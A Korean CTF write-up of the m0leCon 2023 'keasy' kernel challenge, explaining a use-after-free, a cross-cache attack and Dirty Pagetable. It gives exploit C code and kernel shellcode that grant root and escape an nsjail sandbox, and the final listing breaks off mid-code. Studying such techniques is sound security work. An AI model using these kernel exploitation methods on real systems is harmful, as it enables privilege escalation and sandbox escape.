---
title: "[Writeup] m0leCon 2023 - keasy"
excerpt: "Cross-Cache Attack과 Dirty Pagetable 공격을 실습해 보자"

categories:
  - Writeups
tags:
  - [writeup, m0lecon, m0lecon 2023, keasy, dirty pagetable, cross-cache attack]

permalink: /writeups/m0lecon-2023-keasy/

toc: true
toc_sticky: true

date: 2025-08-09
last_modified_at: 2025-08-09
---

> [이 글](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606)을 참고했습니다.  
> 관련된 파일은 윗 글에서 다운받을 수 있습니다.

# 0. Introduction

## 0-1. 문제 분석

`run.sh` 파일을 열어 보면 qemu를 구동할 때 다음과 같은 옵션이 있는 것을 확인할 수 있다.
```shell
qemu-system-x86_64 \
  ...
  -hda flag.txt \

```

이를 통해 flag.txt를 외부 저장소로 마운트한다는 것을 알 수 있다. 마운트하는 다른 장치는 없으므로 `/dev/sda`를 읽어오면 flag를 얻을 수 있음을 알 수 있다.

초기화 스크립트인 `/etc/init.d/rcS`를 보면 다음과 같은 라인에 주목해볼 수 있다.

```shell
#setsid /bin/cttyhack setuidgid root /bin/sh
setsid /bin/cttyhack setuidgid root /usr/bin/jail
```

이를 통해 nsjail을 통해 sandbox에 들어간 상태로 쉘을 얻을 수 있음을 알 수 있고, 따라서 `/dev/sda`에 접근할 수 없음을 알 수 있다. 실제로 윗 줄의 주석을 풀고 부팅하면

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/root_cat_dev_sda.png" alt="root_cat_dev_sda.png">
</center>

위와 같이 장치에 잘 접근해 flag를 읽을 수 있지만, 원래대로 부팅하면

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/nsjail_cat_dev_sda.png" alt="nsjail_cat_dev_sda.png">
</center>

위와 같이 접근하지 못하는 것을 알 수 있다. 따라서 우리는 권한 상승과 nsjail 탈출을 동시에 해야 한다.

## 0-2. 기본 설정

디버거로는 gef를 사용했으며, 커널의 심볼을 자동으로 올려주는 `vmlinux`와 물리 주소를 볼 수 있는 `xp` 명령등을 사용하기 위해 `gef-kernel`을 얹어 사용했다.
`gef-kernel` 플러그인은 [여기](https://github.com/destr4ct/gef-kernel)에서 받을 수 있다. 

# 1. 코드 분석

주어진 코드를 분석해보면, 다음 부분에 주목해볼 수 있다.

```c
static long keasy_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
	...
    myfile = anon_inode_getfile("[easy]", &keasy_file_fops, NULL, 0);

    fd = get_unused_fd_flags(O_CLOEXEC);
    ...
    fd_install(fd, myfile);

	if (copy_to_user((unsigned int __user *)arg, &fd, sizeof(fd))) {
		ret = -EINVAL;
		goto err;
	}
	...
err:
    fput(myfile);
out:
	return ret;
}
```

만약 `fd_install()`까지 실행된 후 `copy_to_user()`이 실패한다면, `fput()`을 통해 열린 파일은 닫히지만 `fd`를 사용해 여전히 이 파일 구조체에 접근할 수 있게 된다. 
따라서 `copy_to_user()`을 의도적으로 실패시킨 후 할당된 `fd`값을 유추하면 이미 해제된 파일 구조체에 접근이 가능하고, 따라서 UAF 취약점이 발생하고 있다는 것을 알 수 있다. 

# 2. Cross-Cache Attack

## 2-1. Dangling Ptr 얻기

위에서 봤듯, `copy_to_user()`를 실패시켜야 UAF를 트리거할 수 있다.
이는 `ioctl()` 호출 시 쓸 수 없는 메모리 주소를 넘기면 되기 때문에 간단하게 구현이 가능하다. 여기서는 `NULL`을 넘겨 쓰기가 실패하도록 했다. 
또한 `fd`값은 어차피 새로운 파일이 열릴 때마다 하나씩 증가하며 할당되므로, 직전에 할당된 `fd`가 무엇인지 알고 있으면 "[easy]"에 대한 `fd` 추론도 간단하게 할 수 있다. 

여기서 `file`구조체가 generic cache가 아닌 dedicated cache에 담긴다는 것을 고려하면 cross-cache attack을 고려해볼 수 있다. 
이를 위해 `ioctl()`을 호출해 UAF를 트리거하기 전 다른 `file`을 다수 할당해야 한다. 또한 공격 성공률을 높이기 위해 하나의 CPU만 사용해(즉, 하나의 `per-CPU` slab만 사용해)야 한다.


```c
void bind_core(int core) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

int main() {
    ...
    // 우선 기존의 dedicated cache를 채워야 함
    printf("[*] spraying files, from 0 to %d\n", COUNT_FILES / 2 - 1);
    for (int i = 0; i < COUNT_FILES / 2; i++) {
      files[i] = open("/", O_RDONLY);
    }
    
    // 여기서 dangling file에 대한 fd를 유추해야 함
    // 마지막으로 할당받은 fd에서 하나 더한 값임
    int easy_fd = files[COUNT_FILES / 2 - 1] + 1;
    // 해제
    printf("[*] makeing dangling ptr\n");
    printf("[*] last allocated fd was %d\n", files[COUNT_FILES / 2 - 1]);
    ioctl(fd, 0, 0xdeadbeef);  
    // [easy]가 닫히며 이를 위한 file이 해제되나
    // easy_fd로 접근이 가능함 -> UAF
    
    // 나머지 file spray
    printf("[*] spraying files, from %d to %d\n", COUNT_FILES / 2, COUNT_FILES);
    for (int i = COUNT_FILES / 2; i < COUNT_FILES; i++) {
        files[i] = open("/", O_RDONLY);
    }
    ...
}
```

다음으로 열었던 파일들을 전부 닫아 slab 전체의 recycle을 유도한다.

```c
// 다 닫아서 recycle 유도
printf("Closing all files\n");
for (int i = 0; i < COUNT_FILES; i++) {
  close(files[i]);
}
```

## 2-2. PTE 할당

다음으로 SLUBStick에서 봤던 것처럼(방식은 살짝 다르지만) UAF를 AAR/AAW 프리미티브로 만들기 위해 PTE를 할당한 후 이를 덮어서 물리 주소에 대한 AAR/AAW를 얻는다. 
이를 위해 spray 전에 `mmap()`을 통해 대량으로 메모리를 mapping해 놓는다.

```c
// 다수 페이지 mmap() 
// 아직 PTE는 할당되지 않음 (쓰기/읽기가 없었기 때문에)
char *pages[COUNT_PAGES];
for (int i = 0; i < COUNT_PAGES; i++) {
    pages[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                         0x8000, PROT_READ|PROT_WRITE,
                         MAP_ANONYMOUS|MAP_SHARED, -1, 0);
}

printf("[*] spraying files, from 0 to %d\n", COUNT_FILES / 2 - 1);
...
```

이때 주목해야 할 점은 `mmap()`으로 mapping했다고 해서 무조건 PTE가 생기지는 않는다는 것이다. 
실제로 PTE가 만들어지는 시점은 page fault가 일어나는 시점, 즉 새로 할당받은 page에 접근할 때이다. 
따라서 다음과 같이 recycle 후 할당받은 page에 접근하며 쓰기를 시도하면 이에 대한 PTE가 생기고, 우리가 방금 recycle한 slab(즉, page)에 PTE가 할당되게 된다.

```c
// 다 닫아서 recycle 유도
...

// 여기서 PTE가 할당됨 -> 방금 recycle된 page가 PTE가 됨
printf("[*] writing to pages\n");
for (int i = 0; i < COUNT_PAGES; i++)
  for (int j = 0; j < 8; j++)
      *(pages[i] + j*0x1000) = 'A' + j;
```

GDB로 살펴보면 실제로 dangling ptr이 가리키고 있는 곳에 PTE가 할당되었음을 알 수 있다.


<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/original_file.png" alt="original_file.png">
</center>
{% include gallery caption="원래 file 구조체 (`fput()` 호출 전)" %}

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/after_recycle_allocate_pte.png" alt="after_recycle_allocate_pte.png">
</center>
{% include gallery caption="recycle / PTE 할당 후" %}

이제 이 PTE를 조작해서 우리가 원하는 임의의 물리 주소로 바꿔야 한다. 그러나 `file` 구조체를 살펴보면

```c
struct file {
    union {
        struct llist_node  f_llist;
        struct rcu_head    f_rcuhead;
        unsigned int      f_iocb_flags;
    };
    /*
    * Protects f_ep, f_flags.
    * Must not be taken from IRQ context.
    */
    spinlock_t      f_lock;
    fmode_t         f_mode;
    atomic_long_t       f_count;
    struct mutex       f_pos_lock;
...
```

위와 같이 각 필드에 있는 값들이 우리 마음대로 쓸 수 있는 값이 아니라는 것을 알 수가 있다.  
예를 들어 `file+0x38`에 있는 `f_count`는 해당 파일이 참조된 횟수를 담고 있는데, 이는 `dup()`를 통해 늘릴 수 있다. 
하지만 `dup()`은 각 파일에 대해 최대 `0xffff`번만큼만 가능하기 때문에[^1] 이를 통해서 AAR/AAW를 구현하는 것은 무리가 있다.
그러나 `dup()`를 0x1000번 호출해 다음 page를 가리키도록 하면 최소한 dangling ptr로 조작할 수 있는 page는 알아낼 수 있다.

```c
// 영향을 받는 PTE를 알아내야 하기 때문에 PTE의 entry 7 (+0x38)의 값을 조작함
// -> 원래 file 구조체의 f_count 필드가 있는 위치이므로 dup(fd)를 통해 1씩 증가가 가능함
// 0x1000번 증가시키면 다음 page를 가리키게 되므로 H가 아닌 다른 값이 쓰여있을 것임
for (int i = 0; i < 0x1000; i++) {
    if (dup(easy_fd) < 0) {
        fatal("dup");
    }
}
printf("[*] dup\n");

// spray한 pages를 돌면서 easy_fd로 조작가능한 page 가상주소를 알아낼 수 있음
char *evil = NULL;
for (int i = 0; i < COUNT_PAGES; i++) {
    printf("[+] probing %p...", pages[i] + 0x7000);
    fflush(stdout);
    if (*(pages[i] + 0x7000) != 'A' + 7) {
        evil = pages[i] + 0x7000;
        break;
    }
    printf("fail\n");
}
printf("success\n[*] affected address: %p\n", evil);
```

그림으로 표현하면 다음과 같다(여기서는 예를 들기 위해 영향받는 페이지가 `pages[10]`이라고 가정한다).

<center>
    <a href="/assets/images/posts_img/writeups/m0lecon-2023-keasy/ack_affected_page_1.png" alt="ack_affected_page_1.png">
        <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/ack_affected_page_1.png" alt="ack_affected_page_1.png">
    </a>
</center>
{% include gallery caption="`dup()` 호출 전 (좌) / `dup()` 호출 후 (우)" %}

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/before_recycle_allocate_pte_mem.png" alt="before_recycle_allocate_pte_mem.png">
</center>
{% include gallery caption="`dup()` 호출 전 실제 메모리 모습" %}

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/after_recycle_allocate_pte_mem.png" alt="after_recycle_allocate_pte_mem.png">
</center>
{% include gallery caption="`dup()` 호출 후 실제 메모리 모습" %}

## 2-3. AAR / AAW

앞서 말했듯 우리는 PTE page 전체에 대한 쓰기/읽기가 필요하고, 이를 위해 DMA-BUF를 활용해볼 수 있다. 
DMA_BUF는 PTE와 가까운 영역에 배치되므로 충분히 `dup()`을 반복 호출해 도달할 수 있다는 점을 고려하면, 다음과 깉은 공격 방법을 생각해볼 수 있다.

1. PTE를 할당받는 도중 DMA_BUF를 할당받음 (PTE 중간에 DMA_BUF가 존재하도록)
2. 위에서 말한 방법을 사용해 우리가 조작할 수 있는 PTE를 특정함. (이때 이 PTE의 영향을 받는 가상주소를 `evil`이라 함)
3. `evil`을 `munmap()`하고, `dma_buf`를 그 자리에 `mmap()`하면 우선 page 전체에 대한 읽기/쓰기가 가능해짐.
4. 마지막으로 한 번 더 `dup()`을 0x1000번 호출해 `dma_buf`가 가리키고 있는 page를 다음 page로 옮김. 이때 page 사이에 DMA_BUF를 할당했기 때문에 아마 다음 page는 또 다른 PTE일 것임
5. 이제 DMA_BUF에 쓰거나 읽으면 PTE를 조작하는 것과 동일함.

```c
// 이제 이 주소를 munmap()한 후 dma_buf로 mmap()하면
// 이 주소 전체에 대한 읽기/쓰기를 할 수 있게 됨
munmap(evil, 0x1000);
char *dma_buf = mmap(evil, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);

// 다음으로 한 번 더 dup() 호출을 통해 이제는 dma_buf가 가리키고 있는 page를
// 다음 페이지를 가리키도록 하면
// 다음 페이지에 있는 PTE를 dma_buf를 통해 접근해서 조작할 수 있음
for (int i = 0; i < 0x1000; i++) {
    if (dup(easy_fd) == -1) {
        fatal("dup");
    }
}
// 이제 dma_buf에 쓰고 읽으면 PTE를 조작할 수 있게 됨
```

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/munmap_mmap.png" alt="munmap_mmap.png">
</center>
{% include gallery caption="`munmap()`, `mmap()` 호출 직후. 여기서 다시 `dup()`을 0x1000번 호출하면 <br> `dma_buf`가 `pages[21]`의 PTE를 가리키며 `pages[21]`의 PTE에 쓸 수 있다. (숫자는 예시)" %}

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/munmmap_mmap_after_dup_mem.png" alt="munmmap_mmap_after_dup_mem.png">
</center>
{% include gallery caption="`dup()` 호출 직후 메모리 모습. `dma_buf`(이전에는 `evil`)이 PTE를 가리키고 있는 모습을 확인 가능하다." %}

이제 PTE에 우리가 원하는 물리 주소를 쓴다. 이때 물리 주소 `0x9c000`에 커널 물리 주소의 base와 연관된 값이 적혀 있고, 
이 물리 주소가 항상 고정된다는 것을 고려해야 한다. 이를 이용하면 다음과 같이 커널의 물리 주소 base를 알아낼 수 있다. 
또한 `dma_buf`가 가리키는 PTE의 영향을 받는 가상주소는 위에서 했던 것과 같은 방법으로 쉽게 알아낼 수 있다.

```c
// 커널의 물리 베이스 주소를 구함
void *affected_addr = NULL;
// 0x9c000 주소에는 커널의 물리 주소 base가 적혀 있고
// 이 물리 주소는 항상 고정임
*(size_t*)dma_buf = 0x800000000009c067;

// dma_buf를 통해 수정한 PTE의 영향을 받는 주소를 알아내고
// 이 주소에서 값을 읽어 커널의 물리 주소를 알아냄
for (int i = 0; i < COUNT_PAGES; i++) {
    if (pages[i] == evil) continue;
    // 위의 PTE 수정을 통해 값이 바뀐 주소에는 우리가 쓴 값 ('A'..'G')가 아니라
    // 이보다 훨씬 큰 값이 쓰여 있을 것이기 때문에
    // 이를 통해 영향받는 page를 알아낼 수 있게 됨
    if (*(size_t*)pages[i] > 0xffff) {
        affected_addr = pages[i];
        printf("[+] Found victim page table: %p\n", affected_addr);
        break;
    }
}

// 0xfff -> 하위 12비트(flags)
size_t phys_base = ((*(size_t*)affected_addr) & ~0xfff) - 0x1c04000;
printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);
```

<center>
    <img src="/assets/images/posts_img/writeups/m0lecon-2023-keasy/kbase_leak.png" alt="kbase_leak.png">
</center>



# 3. Escape nsjail

이제 nsjail을 탈출해야 한다. 이를 위해 쉘코드를 만든 후 이를 어딘가에 쓴 후, 실행시키는 방법을 생각해볼 수 있다.
이때 PTE를 조작할 수 있으므로 원래는 쓰기가 금지된 구역조차 pte의 flag를 조작해 쓸 수 있다는 점을 고려하면,
커널 함수를 만든 쉘코드로 덮어버리는 방법을 생각할 수 있다. 여기서는 커널 함수인 `do_symlinkat()`을 덮는다.
필요한 offset들은 `/proc/kallsyms`를 조회하고 간단한 offset 계산을 통해 얻을 수 있다.

```nasm
; 물리 주소 offset
init_cred         equ 0x1445ed8
commit_creds      equ 0x00ae620
find_task_by_vpid equ 0x00a3750
init_nsproxy      equ 0x1445ce0
switch_task_namespaces equ 0x00ac140
init_fs                equ 0x1538248
copy_fs_struct         equ 0x027f890
kpti_bypass            equ 0x0c00f41

_start:
  endbr64
  call a
a:
  pop r15 ; 여기서 현재 rip가 r15로 들어감
  sub r15, 0x24d4c9 ; 물리 base 다시 계산
	
  ; root 권한 탈취
  ; commit_creds(init_cred) [3]
  lea rdi, [r15 + init_cred]
  lea rax, [r15 + commit_creds]
  call rax

  ; task = find_task_by_vpid(1) [4]
  mov edi, 1
  lea rax, [r15 + find_task_by_vpid]
  call rax

  ; switch_task_namespaces(task, init_nsproxy) [5]
  mov rdi, rax
  lea rsi, [r15 + init_nsproxy]
  lea rax, [r15 + switch_task_namespaces]
  call rax
	
  ; nsjail 탈출
  ; new_fs = copy_fs_struct(init_fs) [6]
  lea rdi, [r15 + init_fs]
  lea rax, [r15 + copy_fs_struct]
  call rax
  mov rbx, rax

  ; current = find_task_by_vpid(getpid())
  mov rdi, 0x1111111111111111   ; will be fixed at runtime
  lea rax, [r15 + find_task_by_vpid]
  call rax

  ; current->fs = new_fs [8]
  mov [rax + 0x740], rbx

  ; kpti trampoline [9]
  xor eax, eax
  mov [rsp+0x00], rax
  mov [rsp+0x08], rax
  mov rax, 0x2222222222222222   ; win
  mov [rsp+0x10], rax
  mov rax, 0x3333333333333333   ; cs
  mov [rsp+0x18], rax
  mov rax, 0x4444444444444444   ; rflags
  mov [rsp+0x20], rax
  mov rax, 0x5555555555555555   ; stack
  mov [rsp+0x28], rax
  mov rax, 0x6666666666666666   ; ss
  mov [rsp+0x30], rax
  lea rax, [r15 + kpti_bypass]
  jmp rax

  int3
```

이때 `0x1111…`, `0x2222…` 같은 값들은 실제로 exploit이 실행될 때 바꾸기 위해 넣어놓은 placeholder이다. 
아무 값이나 사용해도 되지만 다른 opcode와 겹치면 안 되기 때문에 독특한 값을 넣어두어야 한다. 
이를 컴파일한 후 맞게 바꿔주고, `do_symlinkat()`을 쉘코드로 잘 덮어준 후 호출하면 된다.

```c
char shellcode[] = {0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc};
void *p;

// 쉘코드 짤 때 넣어놨던 임시 값들을
// 실제 값으로 수정
p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
*(size_t*)p = getpid();
p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
*(size_t*)p = (size_t)&win;
p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
*(size_t*)p = user_cs;
p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
*(size_t*)p = user_rflags;
p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
*(size_t*)p = user_rsp;
p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
*(size_t*)p = user_ss;

// 덮기
memcpy(affected_addr + (phys_func & 0xfff), shellcode, sizeof(shellcode));
puts("[+] GO!GO!");

// 여기서 symlink를 호출하며 넣어둔 shellcode로 실행 흐름이 넘어감
fflush(stdout);
printf("%d\n", symlink("a", "a"));
puts("[-] Failed...");
close(fd);
getchar();
return 0;
```

전체 exploit 코드는 다음과 같다.

<details>
<summary>펼치기/접기</summary>
{% highlight c %}

#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define COUNT_PAGES 0x200
#define COUNT_FILES 0x100

#define DMA_HEAP_IOCTL_ALLOC 0xc0184800

typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
    u64 len;
    u32 fd;
    u32 fd_flags;
    u64 heap_flags;
};

unsigned long user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
    char buf[0x100];
    int fd = open("/dev/sda", O_RDONLY);
    if (fd < 0) {
        puts("[-] Lose...");
    } else {
        puts("[+] Win!");
        read(fd, buf, 0x100);
        write(1, buf, 0x100);
        puts("[+] Done");
    }
    exit(0);
}

void bind_core(int core) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

int main() {
    save_state();
    bind_core(0);

    int dmafd = creat("/dev/dma_heap/system", O_RDWR);
    int fd = open("/dev/keasy", O_RDWR);

    // 다수 페이지 할당 -> 아직 PTE는 할당되지 않음 (쓰기/읽기가 없었기 때문에)
    char *pages[COUNT_PAGES];
    for (int i = 0; i < COUNT_PAGES; i++) {
        pages[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                             0x8000, PROT_READ|PROT_WRITE,
                             MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    }

    int files[COUNT_FILES];

    // 우선 기존의 dedicated cache를 채워야 함
    printf("[*] spraying files, from 0 to %d\n", COUNT_FILES / 2 - 1);
    for (int i = 0; i < COUNT_FILES / 2; i++) {
        files[i] = open("/", O_RDONLY);
    }

    // 여기서 dangling ptr 얻기
    // 마지막으로 할당받은 fd에서 하나 더한 값임
    int easy_fd = files[COUNT_FILES / 2 - 1] + 1;

    // 해제
    printf("[*] makeing dangling ptr\n");
    printf("[*] last allocated fd was %d\n", files[COUNT_FILES / 2 - 1]);
    ioctl(fd, 0, 0xdeadbeef);

    // 나머지 file spray
    printf("[*] spraying files, from %d to %d\n", COUNT_FILES / 2, COUNT_FILES);
    for (int i = COUNT_FILES / 2; i < COUNT_FILES; i++) {
        files[i] = open("/", O_RDONLY);
    }

    // 다 닫아서 recycle 유도
    printf("[*] closing all files\n");
    for (int i = 0; i < COUNT_FILES; i++) {
        close(files[i]);
    }

    // 이제 dedicated cache가 recycle되었지만, easy_fd로 여전히 접근이 가능함
    // PTE 할당 유도
    printf("[*] writing to pages\n");
    // Allocate many PTEs (page fault)
    for (int i = 0; i < COUNT_PAGES / 2; i++)
        for (int j = 0; j < 8; j++)
            *(pages[i] + j*0x1000) = 'A' + j;

    // 중간에 dma_buf를 끼워넣음
    int dma_buf_fd = -1;
    struct dma_heap_allocation_data data;
    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;
    if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
        fatal("DMA alloc failed");

    printf("[+] dma_buf_fd: %d\n", dma_buf_fd = data.fd);

    for (int i = COUNT_PAGES / 2; i < COUNT_PAGES; i++)
        for (int j = 0; j < 8; j++)
            *(pages[i] + j*0x1000) = 'A' + j;

    // 영향을 받는 PTE를 알아내야 하기 때문에 PTE의 entry 7 (+0x38)의 값을 조작함
    // -> 원래 file 구조체의 f_count 필드가 있는 위치이므로 dup(fd)를 통해 1씩 증가가 가능함
    // 0x1000번 증가시키면 다음 page를 가리키게 되므로 H가 아닌 다른 값이 쓰여있을 것임
    for (int i = 0; i < 0x1000; i++) {
        if (dup(easy_fd) < 0) {
            fatal("dup");
        }
    }
    printf("[*] dup\n");

    // spray한 pages를 돌면서 easy_fd로 조작가능한 page 가상주소를 알아낼 수 있음
    char *evil = NULL;
    for (int i = 0; i < COUNT_PAGES; i++) {
        printf("[+] probing %p...", pages[i] + 0x7000);
        fflush(stdout);
        if (*(pages[i] + 0x7000) != 'A' + 7) {
            evil = pages[i] + 0x7000;
            break;
        }
        printf("fail\n");
    }
    printf("success\n[*] affected address: %p\n", evil);

    // 이제 이 주소를 munmap()한 후 dma_buf로 mmap()하면
    // 이 주소 전체에 대한 읽기/쓰기를 할 수 있게 됨
    munmap(evil, 0x1000);
    char *dma_buf = mmap(evil, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);

    // 다음으로 한 번 더 dup() 호출을 통해 이제는 dma_buf가 가리키고 있는 page를
    // 다음 페이지를 가리키도록 하면
    // 다음 페이지에 있는 PTE를 dma_buf를 통해 접근해서 조작할 수 있음
    for (int i = 0; i < 0x1000; i++) {
        if (dup(easy_fd) == -1) {
            fatal("dup");
        }
    }

    // 이제 dma_buf에 쓰고 읽으면 PTE를 조작할 수 있게 됨

    // 커널의 물리 베이스 주소를 구함
    void *affected_addr = NULL;
    // 0x9c000 주소에는 커널의 물리 주소 base가 적혀 있고
    // 이 물리 주소는 항상 고정임
    *(size_t*)dma_buf = 0x800000000009c067;

    // dma_buf를 통해 수정한 PTE의 영향을 받는 주소를 알아내고
    // 이 주소에서 값을 읽어 커널의 물리 주소를 알아냄
    for (int i = 0; i < COUNT_PAGES; i++) {
        if (pages[i] == evil) continue;
        // 위의 PTE 수정을 통해 값이 바뀐 주소에는 우리가 쓴 값 ('A'..'G')가 아니라
        // 이보다 훨씬 큰 값이 쓰여 있을 것이기 때문에
        // 이를 통해 영향받는 page를 알아낼 수 있게 됨
        if (*(size_t*)pages[i] > 0xffff) {
            affected_addr = pages[i];
            printf("[+] Found victim page table: %p\n", affected_addr);
            break;
        }
    }
    // 0xfff -> 하위 12비트, flags
    size_t phys_base = ((*(size_t*)affected_addr) & ~0xfff) - 0x1c04000;
    printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);

    puts("[+] Overwriting do_symlinkat...");
    size_t phys_func = phys_base + 0x24d4c0;  // symlinkat의 offset
    *(size_t*)dma_buf = (phys_func & ~0xfff) | 0x8000000000000067;
    // 0x8...67에서
    // 0x8.. -> NX
    // 0x...67 -> P, RW, US, A, D

    // nsjail에서 나가고 win으로 넘어감
    // 이때 pid는 0x1111...,
    // win 주소는 0x2222...,
    // cs는 0x3333...,
    // rflags는 0x4444...,
    // stack는 0x5555...,
    // ss는 0x6666...,
    // 으로 표시해둠

    char shellcode[] = {0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc};
    void *p;

    // 쉘코드 짤 때 넣어놨던 임시 값들을
    // 실제 값으로 수정
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
